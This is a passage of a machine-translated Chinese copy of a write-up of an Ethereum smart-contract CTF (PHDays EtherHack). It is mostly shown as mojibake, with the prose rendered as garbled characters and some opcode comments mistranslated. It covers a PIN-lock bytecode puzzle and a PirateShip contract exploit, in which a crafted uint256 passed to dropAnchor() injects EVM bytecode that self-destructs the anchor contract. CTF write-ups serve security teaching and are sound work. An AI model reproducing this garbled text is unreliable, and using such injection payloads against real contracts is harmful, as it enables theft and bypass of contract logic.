class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 lt iszero</code> </pre> <br> å¹¶ä¸”è¯¥å€¼å°äº0x39ï¼š <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x39</span></span> dup3 gt iszero</code> </pre> <br> è¿™å®é™…ä¸Šæ˜¯æ£€æŸ¥ç»™å®šå­—èŠ‚æ˜¯å¦åœ¨0åˆ°9çš„èŒƒå›´å†…ã€‚å¦‚æœæ£€æŸ¥æˆåŠŸï¼Œé‚£ä¹ˆæˆ‘ä»¬å‘ç°è‡ªå·±å¤„äºæœ€é‡è¦çš„ä»£ç å—ä¸­ï¼š <br><br><img src="https://habrastorage.org/getpro/habr/post_images/085/2d4/27b/0852d427bd50ab1d0da2fed5131dfac2.png" alt="å›¾ç‰‡"><br><br> è®©æˆ‘ä»¬å°†æ­¤å—åˆ†ä¸ºå‡ éƒ¨åˆ†ï¼š <br><br>  1.å †æ ˆä¸­çš„ç¬¬ä¸‰ä¸ªå…ƒç´ æ˜¯PINç ç¬¬nä¸ªå­—èŠ‚çš„ASCIIç ã€‚  0x30ï¼ˆASCIIç ä¸ºé›¶ï¼‰è¢«å‹å…¥å †æ ˆï¼Œç„¶åä»è¯¥å­—èŠ‚çš„ä»£ç ä¸­å‡å»ï¼š <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0x30</span></span> dup3 sub</code> </pre> <br> ä¹Ÿå°±æ˜¯è¯´ï¼Œ <code>pincode[i] - 48</code> ï¼Œå®é™…ä¸Šæˆ‘ä»¬ä»ASCIIç ä¸­å¾—åˆ°ä¸€ä¸ªæ•°å­—ï¼Œæˆ‘ä»¬ç§°å®ƒä¸ºdã€‚ <br><br>  2. 0x4è¢«æ·»åŠ åˆ°å †æ ˆä¸­ï¼Œå¹¶ç”¨ä½œå †æ ˆä¸­ç¬¬äºŒä¸ªå…ƒç´ dçš„æŒ‡æ•°ï¼š <br><br><pre> <code class="cpp hljs">swap1 pop push1 <span class="hljs-number"><span class="hljs-number">0x4</span></span> dup2 <span class="hljs-built_in"><span class="hljs-built_in">exp</span></span></code> </pre> <br> å³ï¼Œ <code>d ** 4</code> ã€‚ <br><br>  3.æ£€ç´¢å †æ ˆçš„ç¬¬äº”ä¸ªå…ƒç´ ï¼Œå¹¶å°†ä¹˜å¹‚ç»“æœæ·»åŠ åˆ°å…¶ä¸­ã€‚ å°†æ­¤æ€»å’Œç§°ä¸ºSï¼š <br><br><pre> <code class="cpp hljs">dup5 add swap4 pop dup1</code> </pre> <br> å³ï¼Œ <code>S += d ** 4</code> ã€‚ <br><br>  4. 0xaï¼ˆ10çš„ASCIIç ï¼‰è¢«å‹å…¥å †æ ˆï¼Œå¹¶ç”¨ä½œå †æ ˆä¸­ç¬¬ä¸ƒä¸ªå…ƒç´ ï¼ˆåœ¨æ­¤åŠ æ³•ä¹‹å‰ä¸ºç¬¬å…­ä¸ªï¼‰çš„ä¹˜æ³•å™¨ã€‚ æˆ‘ä»¬ä¸çŸ¥é“å®ƒæ˜¯ä»€ä¹ˆï¼Œå› æ­¤æˆ‘ä»¬å°†å…¶ç§°ä¸ºUã€‚ç„¶åå°†dæ·»åŠ åˆ°ä¹˜æ³•ç»“æœä¸­ï¼š <br><br><pre> <code class="cpp hljs">push1 <span class="hljs-number"><span class="hljs-number">0xa</span></span> dup7 mul add swap5 pop</code> </pre> <br> ä¹Ÿå°±æ˜¯è¯´ï¼š <code>U = U * 10 + d</code>æˆ–æ›´ç®€å•åœ°è¯´ï¼Œè¯¥è¡¨è¾¾å¼å°†æ•´ä¸ªpinä»£ç ä½œä¸ºä¸€ä¸ªæ•°å­—ä»å•ä¸ªå­—èŠ‚ä¸­æ¢å¤<code>([0x1, 0x3, 0x3, 0x7] â†’ 1337)</code> ã€‚ <br><br> æˆ‘ä»¬æ‰€åšçš„æœ€å›°éš¾çš„äº‹æƒ…ï¼Œç°åœ¨è®©æˆ‘ä»¬åœ¨å¾ªç¯åç»§ç»­æ‰§è¡Œä»£ç ã€‚ <br><br><pre> <code class="cpp hljs">dup5 dup5 eq</code> </pre> <br> å¦‚æœå †æ ˆä¸Šçš„ç¬¬äº”ä¸ªå…ƒç´ å’Œç¬¬å…­ä¸ªå…ƒç´ ç›¸ç­‰ï¼Œé‚£ä¹ˆæ‰§è¡Œæµç¨‹å°†æŠŠæˆ‘ä»¬å¸¦åˆ°sstoreæŒ‡ä»¤ï¼Œè¯¥æŒ‡ä»¤åœ¨åˆåŒå­˜å‚¨ä¸­è®¾ç½®æŸä¸ªæ ‡å¿—ã€‚ ç”±äºè¿™æ˜¯å”¯ä¸€çš„å­˜å‚¨æŒ‡ä»¤ï¼Œå› æ­¤è¿™æ˜¾ç„¶æ˜¯æˆ‘ä»¬æƒ³è¦çš„ã€‚ <br><br> ä½†æ˜¯å¦‚ä½•é€šè¿‡è¿™é¡¹æµ‹è¯•ï¼Ÿ æ­£å¦‚æˆ‘ä»¬å·²ç»å‘ç°çš„é‚£æ ·ï¼Œå †æ ˆä¸Šçš„ç¬¬äº”ä¸ªå…ƒç´ æ˜¯Sï¼Œç¬¬å…­ä¸ªå…ƒç´ æ˜¯Uã€‚ç”±äºSæ˜¯å°†PINç çš„æ‰€æœ‰ä½åŠ åˆ°ç¬¬å››å¹‚çš„æ€»å’Œï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ»¡è¶³æ­¤æ¡ä»¶çš„PINç ã€‚ åœ¨æˆ‘ä»¬çš„æ¡ˆä¾‹ä¸­ï¼Œåˆ†æè¡¨æ˜<code>1**4 + 3**4 + 3**4 + 7**4</code>ä¸ç­‰äº1337ï¼Œå¹¶ä¸”æˆ‘ä»¬æ²¡æœ‰è¾¾åˆ°è·èƒœçš„<code>sstore</code>æŒ‡ä»¤ã€‚ <br><br> ä½†æ˜¯ç°åœ¨æˆ‘ä»¬å¯ä»¥è®¡ç®—ä¸€ä¸ªæ»¡è¶³è¯¥æ–¹ç¨‹å¼æ¡ä»¶çš„æ•°å­—ã€‚ åªæœ‰å››ä¸ªæ•°å­—å¯ä»¥å†™ä¸ºå®ƒä»¬çš„å››åº¦æ•°å­—çš„æ€»å’Œï¼š1634ã€8208å’Œ9474ã€‚å®ƒä»¬ä¸­çš„ä»»ä½•ä¸€ä¸ªéƒ½å¯ä»¥æ‰“å¼€é”ï¼ <br><br><h2> æµ·ç›—èˆ¹ </h2><br><h4> å˜¿ï¼Œè¨æ‹‰æ ¼ï¼ ä¸€è‰˜æµ·ç›—èˆ¹åœæ³Šåœ¨æ¸¯å£ã€‚ è®©ä»–æ”¾ä¸‹é”šï¼Œä¸ä¹”åˆ©Â·ç½—æ°ï¼ˆJolly Rogerï¼‰å‡èµ·å›½æ——ï¼Œå»å¯»æ‰¾å®è—ã€‚ </h4><br> åˆåŒæ‰§è¡Œçš„æ ‡å‡†è¿‡ç¨‹åŒ…æ‹¬ä¸‰ä¸ªåŠ¨ä½œï¼š <br><br><ol><li> è°ƒç”¨<code>dropAnchor()</code>å‡½æ•°ï¼Œå…¶å—å·åº”æ¯”å½“å‰å—å¤§100,000å—ã€‚ è¯¥å‡½æ•°åŠ¨æ€åˆ›å»ºä¸€ä¸ªåˆåŒï¼Œå³â€œé”šâ€ï¼Œå¯ä»¥åœ¨æŒ‡å®šå—åä½¿ç”¨<code>selfdestruct()</code>å°†å…¶â€œè§£é™¤â€ã€‚ </li><li> è°ƒç”¨<code>pullAnchor()</code>å‡½æ•°ï¼Œå¦‚æœç»è¿‡äº†è¶³å¤Ÿçš„æ—¶é—´ï¼ˆå¾ˆå¤šæ—¶é—´ï¼ï¼‰ï¼Œå®ƒå°†å¯åŠ¨<code>pullAnchor()</code> ï¼‰ã€‚ </li><li> è°ƒç”¨sailAwayï¼ˆï¼‰ï¼Œå¦‚æœä¸å­˜åœ¨é”šåå®šï¼Œåˆ™å°†<code>blackJackIsHauled</code>è®¾ç½®ä¸ºtrueã€‚ </li></ol><br><pre> <code class="cpp hljs">pragma solidity ^<span class="hljs-number"><span class="hljs-number">0.4</span></span><span class="hljs-number"><span class="hljs-number">.19</span></span>; contract PirateShip { address <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> anchor = <span class="hljs-number"><span class="hljs-number">0x0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">bool</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> blackJackIsHauled = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; <span class="hljs-function"><span class="hljs-function">function </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sailAway</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span></span>{ require(anchor != <span class="hljs-number"><span class="hljs-number">0x0</span></span>); address a = anchor; uint size = <span class="hljs-number"><span class="hljs-number">0</span></span>; assembly { size := extcodesize(a) } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(size &gt; <span class="hljs-number"><span class="hljs-number">0</span></span>) { revert(); <span class="hljs-comment"><span class="hljs-comment">// it is too early to sail away } blackJackIsHauled = true; // Yo Ho Ho! } function pullAnchor() public { require(anchor != 0x0); require(anchor.call()); // raise the anchor if the ship is ready to sail away } function dropAnchor(uint blockNumber) public returns(address addr) { // the ship will be able to sail away in 100k blocks time require(blockNumber &gt; block.number + 100000); // if(block.number &lt; blockNumber) { throw; } // suicide(msg.sender); uint[8] memory a; a[0] = 0x6300; // PUSH4 0x00... a[1] = blockNumber; // ...block number (3 bytes) a[2] = 0x43; // NUMBER a[3] = 0x10; // LT a[4] = 0x58; // PC a[5] = 0x57; // JUMPI a[6] = 0x33; // CALLER a[7] = 0xff; // SELFDESTRUCT uint code = assemble(a); // init code to deploy contract: stores it in memory and returns appropriate offsets uint[8] memory b; b[0] = 0; // allign b[1] = 0x6a; // PUSH11 b[2] = code; // contract b[3] = 0x6000; // PUSH1 0 b[4] = 0x52; // MSTORE b[5] = 0x600b; // PUSH1 11 ;; length b[6] = 0x6015; // PUSH1 21 ;; offset b[7] = 0xf3; // RETURN uint initcode = assemble(b); uint sz = getSize(initcode); uint offset = 32 - sz; assembly { let solidity_free_mem_ptr := mload(0x40) mstore(solidity_free_mem_ptr, initcode) addr := create(0, add(solidity_free_mem_ptr, offset), sz) } require(addr != 0x0); anchor = addr; } ///////////////// HELPERS ///////////////// function assemble(uint[8] chunks) internal pure returns(uint code) { for(uint i=chunks.length; i&gt;0; i--) { code ^= chunks[i-1] &lt;&lt; 8 * getSize(code); } } function getSize(uint256 chunk) internal pure returns(uint) { bytes memory b = new bytes(32); assembly { mstore(add(b, 32), chunk) } for(uint32 i = 0; i&lt; b.length; i++) { if(b[i] != 0) { return 32 - i; } } return 0; } }</span></span></code> </pre> <br> è¯¥æ¼æ´éå¸¸æ˜æ˜¾ï¼šåœ¨<code>dropAnchor()</code>å‡½æ•°ä¸­åˆ›å»ºåå®šæ—¶ï¼Œæˆ‘ä»¬ç›´æ¥æ³¨å…¥äº†æ±‡ç¼–ç¨‹åºæŒ‡ä»¤ã€‚ ä½†æ˜¯ä¸»è¦çš„å›°éš¾æ˜¯åˆ›å»ºä¸€ä¸ªæœ‰æ•ˆè½½è·ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡<code>block.number</code> ã€‚ <br><br> åœ¨EVMä¸­ï¼Œå¯ä»¥ä½¿ç”¨createè¯­å¥åˆ›å»ºåˆåŒã€‚ å®ƒçš„å‚æ•°æ˜¯å€¼ï¼Œè¾“å…¥åç§»é‡å’Œè¾“å…¥å¤§å°ã€‚  valueæ˜¯æ‰˜ç®¡åˆåŒæœ¬èº«çš„å­—èŠ‚ç ï¼ˆåˆå§‹åŒ–ä»£ç ï¼‰ã€‚ åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œåˆå§‹åŒ–ä»£ç +åˆåŒä»£ç æ”¾ç½®åœ¨uint256ä¸­ï¼ˆæ„Ÿè°¢<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">GasToken</a>å›¢é˜Ÿçš„å»ºè®®ï¼‰ï¼š <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x6a63004141414310585733ff600052600b6015f3</span></span></code> </pre> <br> å…¶ä¸­é»‘ä½“å­—æ˜¯æ‰˜ç®¡åˆåŒçš„ä»£ç ï¼Œè€Œ414141æ˜¯æ³¨å…¥ä½ç½®ã€‚ ç”±äºæˆ‘ä»¬é¢ä¸´ç€æ‘†è„±throwæ“ä½œç¬¦çš„ä»»åŠ¡ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ’å…¥æ–°åˆåŒå¹¶é‡å†™åˆå§‹åŒ–ä»£ç çš„å°¾éƒ¨ã€‚ è®©æˆ‘ä»¬å°è¯•ä½¿ç”¨0xffæŒ‡ä»¤æ³¨å…¥åˆåŒï¼Œè¿™å°†å¯¼è‡´ä½¿ç”¨<code>selfdestruct()</code>æ— æ¡ä»¶åˆ é™¤é”šå®šåˆåŒï¼š <br><br><pre>  68 414141ff3f3f3f3f3f ;;  push9åˆçº¦
 60 00 ;; æ¨1 0
 52 ;; å•†åº—
 60 09 ;; æ¨1 9
 60 17 ;; æ¨1 17
 f3 ;; å½’è¿˜ </pre><br> å¦‚æœæˆ‘ä»¬å°†æ­¤å­—èŠ‚åºåˆ—è½¬æ¢ä¸º<code>uint256 (9081882833248973872855737642440582850680819)</code>å¹¶å°†å…¶ç”¨ä½œ<code>dropAnchor()</code>å‡½æ•°çš„å‚æ•°ï¼Œ <code>dropAnchor()</code>å¾—åˆ°ä»¥ä¸‹ä»£ç å˜é‡å€¼ï¼ˆé»‘ä½“å­—çš„å­—èŠ‚ç æ˜¯æˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½ï¼‰ï¼š <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x630068414141ff3f3f3f3f3f60005260096017f34310585733ff</span></span></code> </pre> <br> åœ¨ä»£ç å˜é‡æˆä¸ºinitcodeå˜é‡çš„ä¸€éƒ¨åˆ†ä¹‹åï¼Œæˆ‘ä»¬å¾—åˆ°ä»¥ä¸‹å€¼ï¼š <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x68414141ff3f3f3f3f3f60005260096017f34310585733ff600052600b6015f3</span></span></code> </pre> <br> ç°åœ¨é«˜å­—èŠ‚<code>0x6300</code>æ¶ˆå¤±äº†ï¼Œå…¶ä½™å­—èŠ‚ç åœ¨<code>0xf3 (return)</code>ä¹‹å<code>0xf3 (return)</code> ã€‚ <br><br><img src="https://habrastorage.org/getpro/habr/post_images/433/f75/735/433f757356003d73286fa4709cdedcfd.png" alt="å›¾ç‰‡"><br><br> ç»“æœï¼Œåˆ›å»ºäº†å…·æœ‰æ›´æ”¹é€»è¾‘çš„æ–°åˆåŒï¼š <br><br><pre>  41 ;; å¸åº“
 41 ;; å¸åº“
 41 ;; å¸åº“
 ff ;; è‡ªæ¯
 3f ;; åƒåœ¾
 3f ;; åƒåœ¾
 3f ;; åƒåœ¾
 3f ;; åƒåœ¾
 3f ;; åƒåœ¾ </pre><br> å¦‚æœç°åœ¨è°ƒç”¨pullAnchorï¼ˆï¼‰å‡½æ•°ï¼Œåˆ™è¯¥åˆçº¦å°†è¢«ç«‹å³é”€æ¯ï¼Œå› ä¸ºæˆ‘ä»¬ä¸å†éœ€è¦æ£€æŸ¥block.numberã€‚ ä¹‹åï¼Œæˆ‘ä»¬è°ƒç”¨sailAwayï¼ˆï¼‰å‡½æ•°å¹¶åº†ç¥èƒœåˆ©ï¼ <br><br><h2> ç»“æœ </h2><br><ol><li> ç¬¬ä¸€åï¼Œå¹¶ä»¥ç›¸å½“äº1000ç¾å…ƒçš„é‡‘é¢æ’­å‡ºï¼šAlexey Pertsevï¼ˆp4lexï¼‰ </li><li> ç¬¬äºŒåå’ŒLedger Nano Sï¼šAlexey Markov </li><li> ç¬¬ä¸‰åå’ŒPHDaysçºªå¿µå“ï¼šAlexander Vlasov </li></ol><br> æ‰€æœ‰ç»“æœï¼š <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">etherhack.positive.com/#/scoreboard</a> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d88/d86/955/d88d8695572199f7e3d800f34deb18ee.jpg" alt="å›¾ç‰‡"><br><br> ç¥è´ºè·å¥–è€…ï¼Œå¹¶æ„Ÿè°¢æ‰€æœ‰å‚ä¸è€…ï¼ <br><br>  PSæ„Ÿè°¢<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Zeppelin</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ä½¿Ethernaut CTF</a>å¹³å°<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">çš„</a>æºä»£ç å¼€æºã€‚ </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN414959/">https://habr.com/ru/post/zh-CN414959/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN414945/index.html">çº¦ç¿°Â·éœæ™®é‡‘æ–¯å¤§å­¦åˆ›é€ äº†æ„Ÿè§‰ç–¼ç—›çš„äººé€ çš®è‚¤</a></li>
<li><a href="../zh-CN414947/index.html">åœ¨ReactOSä¸‹è·å–Windowsçš„Git</a></li>
<li><a href="../zh-CN414951/index.html">ä½¿ç”¨CASLåœ¨Expressjsä¸­è¿›è¡Œè®¿é—®ç®¡ç†</a></li>
<li><a href="../zh-CN414953/index.html">Nvidiaæ•™ç¥ç»ç½‘ç»œå‡æ…¢è§†é¢‘æ’­æ”¾é€Ÿåº¦</a></li>
<li><a href="../zh-CN414955/index.html">å…¬å¸ä½¿ç”¨â€œåŒºå—é“¾â€ä¸€è¯æ¥å¢åŠ èµ„æœ¬ã€‚ å¸®åŠ©äº†ä¸€æ®µæ—¶é—´</a></li>
<li><a href="../zh-CN414961/index.html">SERMæ¦‚è¿°</a></li>
<li><a href="../zh-CN414963/index.html">å·²æ‰¾åˆ°ä¸€ç§è§£å†³æ–¹æ³•ï¼Œå¯ä»¥ç»•è¿‡iPhone / iPadä¸Šçš„å¯†ç ä¿æŠ¤ã€‚ ä¸æ˜¯çœŸçš„</a></li>
<li><a href="../zh-CN414965/index.html">â€œæ¬§ç›Ÿçš„ç‰ˆæƒä¿æŠ¤â€ï¼šæ–°çš„æ”¹é©å¯èƒ½ä¸ä»…ä¼šå½±å“åª’ä½“å¹³å°</a></li>
<li><a href="../zh-CN414967/index.html">å¦‚ä½•ä½¿ç”¨Firebase Performance Pluginå‡å°‘é¡¹ç›®çš„æ„å»ºæ—¶é—´</a></li>
<li><a href="../zh-CN414969/index.html">ä½¿ç”¨MSBuildæ‰©å±•æ„å»ºè¿‡ç¨‹</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>